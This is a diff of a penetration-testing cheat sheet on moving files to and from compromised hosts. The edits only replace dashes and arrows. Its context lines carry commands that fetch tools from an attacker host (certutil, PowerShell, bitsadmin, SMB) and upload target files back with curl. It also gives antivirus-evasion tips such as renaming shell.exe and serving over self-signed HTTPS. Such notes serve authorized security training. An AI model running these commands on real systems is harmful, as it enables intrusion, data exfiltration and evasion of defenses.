@@ -1,17 +1,17 @@
 # File Transfers
 
-Getting tools onto a target and files off it. Know at least 3 methods per OS — AV or firewall will block some.
+Getting tools onto a target and files off it. Know at least 3 methods per OS - AV or firewall will block some.
 
 ---
 
 ## Serving Files from Kali
 
-Always start here — pick a server method and keep it running.
+Always start here - pick a server method and keep it running.
 
 ```sh
 # Python HTTP server (most common)
 python3 -m http.server 8080
-python3 -m http.server 80      # port 80 — less likely to be blocked
+python3 -m http.server 80      # port 80 - less likely to be blocked
 
 # SMB server (for Windows targets that can't use HTTP)
 impacket-smbserver share . -smb2support
@@ -26,7 +26,7 @@ nc -lvnp 4444 < file.exe
 
 ---
 
-## Linux Target — Downloading Files
+## Linux Target - Downloading Files
 
 ```sh
 # wget
@@ -49,10 +49,10 @@ scp user@<KALI>:/path/to/file /tmp/file
 
 ---
 
-## Windows Target — Downloading Files
+## Windows Target - Downloading Files
 
 ```sh
-# certutil (almost always available — old school but reliable)
+# certutil (almost always available - old school but reliable)
 certutil -urlcache -split -f http://<KALI>:8080/file.exe C:\temp\file.exe
 
 # PowerShell iwr (Invoke-WebRequest)
@@ -61,10 +61,10 @@ iwr -uri http://<KALI>:8080/file.exe -OutFile C:\temp\file.exe
 # PowerShell WebClient (alternative)
 (New-Object Net.WebClient).DownloadFile("http://<KALI>:8080/file.exe", "C:\temp\file.exe")
 
-# Bitsadmin (background transfer — sneaky)
+# Bitsadmin (background transfer - sneaky)
 bitsadmin /transfer job http://<KALI>:8080/file.exe C:\temp\file.exe
 
-# From SMB share (no download — run directly or copy)
+# From SMB share (no download - run directly or copy)
 copy \\<KALI>\share\file.exe C:\temp\file.exe
 \\<KALI>\share\file.exe           # run directly without downloading
 
@@ -80,7 +80,7 @@ download C:\target\file.txt         # download from target
 
 ---
 
-## Windows Target — Uploading Files Back to Kali
+## Windows Target - Uploading Files Back to Kali
 
 ```sh
 # Via SMB server on Kali
@@ -110,15 +110,15 @@ curl -F "file=@C:\target\file.txt" http://<KALI>:8080/
 
 ## Base64 Encode/Decode (No HTTP Needed)
 
-When you only have a shell and no network tools — paste the file as text.
+When you only have a shell and no network tools - paste the file as text.
 
-**Kali → encode:**
+**Kali -> encode:**
 ```sh
 base64 -w 0 file.exe > file.b64
 cat file.b64         # copy the output
 ```
 
-**On target — decode:**
+**On target - decode:**
 ```powershell
 # PowerShell
 [System.Convert]::FromBase64String("BASE64STRING") | Set-Content -Path C:\temp\file.exe -Encoding Byte
@@ -142,14 +142,14 @@ echo "BASE64STRING" | base64 -d > file.exe
 C:\temp\                    # create if doesn't exist
 C:\Windows\Temp\
 C:\Users\Public\
-C:\inetpub\wwwroot\         # web root — accessible via browser too
+C:\inetpub\wwwroot\         # web root - accessible via browser too
 %APPDATA%\
 ```
 
 ### Linux
 ```
 /tmp/
-/dev/shm/                   # RAM — no disk writes, cleared on reboot
+/dev/shm/                   # RAM - no disk writes, cleared on reboot
 /var/tmp/
 /home/<user>/
 ```
@@ -169,7 +169,7 @@ mv shell.exe shell.txt        # transfer as .txt, rename after
 
 # Encode it (base64 method above)
 
-# Serve over HTTPS (self-signed — some AV skips HTTPS inspection)
+# Serve over HTTPS (self-signed - some AV skips HTTPS inspection)
 openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
 python3 -c "
 import http.server, ssl
